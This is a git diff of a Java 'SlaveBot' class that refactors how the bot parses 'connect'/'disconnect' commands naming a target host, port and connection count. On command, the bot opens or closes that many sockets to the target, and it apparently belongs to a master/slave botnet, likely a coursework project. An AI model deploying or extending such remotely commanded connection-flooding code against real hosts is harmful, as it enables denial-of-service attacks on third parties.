@@ -48,14 +48,18 @@ public class SlaveBot implements Runnable {
 	public static void extractTargetData(String targetData){
 		String delims = " ";
 		StringTokenizer st = new StringTokenizer(targetData, delims);
-		targetData targetObj = new targetData((String)st.nextElement(), ((String) st.nextElement()), ((String) st.nextElement()), (String) st.nextElement());
-		storeTargetData(targetObj);
+		
+		String action  = (String)st.nextElement();
+		String targetHostName = ((String) st.nextElement());
+		String targetPortNumber = ((String) st.nextElement());
+		String numberOfConn = ((String)st.nextElement());
+		
+		storeTargetData(action, targetHostName, targetPortNumber, numberOfConn);
 	}
 
-	public static void storeTargetData(targetData targetObj){
+	public static void storeTargetData(String action, String targetHostName, String targetPortNumber, String numberOfConn){
 
-		String uniqueKey = concatinatedData(targetObj.targetHost, targetObj.port);
-	
+		String uniqueKey = concatinatedData(targetHostName, targetPortNumber);
 
 		/*
 		Set<Entry<String, targetData>> set = targetDataMap.entrySet();
@@ -65,15 +69,17 @@ public class SlaveBot implements Runnable {
 		}
 		*/
 
-		if (targetObj.action.contentEquals("connect")){
+		if (action.contentEquals("connect")){
 			// go create a object and insert into the hash table value
+			targetData targetObj = new targetData(action, targetHostName, targetPortNumber, numberOfConn);
 			targetDataMap.put(uniqueKey, targetObj);
 			performConnect(targetObj.targetHost, targetObj.port, targetObj.numConnections);
 		}
-		else if (targetObj.action.contentEquals("disconnect")){
+		else if (action.contentEquals("disconnect")){
 			// go get the object from the hash-table
 			targetData objFromHashTable =  targetDataMap.get(uniqueKey);
-			performDisconnect(objFromHashTable.targetHost, objFromHashTable.port);
+			Integer numberOfConnToDelete = Integer.parseInt(numberOfConn);
+			performDisconnect(objFromHashTable.targetHost, objFromHashTable.port, numberOfConnToDelete);
 		}
 
 	}
@@ -131,19 +137,19 @@ public class SlaveBot implements Runnable {
 
 	}
 
-	public static void performDisconnect(String ip, String port) {
-		String conKey = concatinatedData(ip, port);
+	public static void performDisconnect(String ip, String port, Integer numberOfConnToDelete) {
+		String uniqueKey = concatinatedData(ip, port);
 		Integer portInt = Integer.parseInt(port);
-		targetData obj = targetDataMap.get(conKey);
+		targetData obj = targetDataMap.get(uniqueKey);
 
-		if (targetDataMap.containsKey(conKey)){
+		if (targetDataMap.containsKey(uniqueKey)){
 			try{
-				for(int i = 0; i<= obj.arrSoc.length; i++){
+				for(int i = 0; i< numberOfConnToDelete; i++){
 					Socket deleteSoc = obj.arrSoc[i];
-					deleteSoc.close();				
+					deleteSoc.close();	
 					System.out.println("Socket closed" + deleteSoc);
 				}
-				targetDataMap.remove(conKey);
+				targetDataMap.remove(uniqueKey);
 			}
 			catch(Exception e){
 
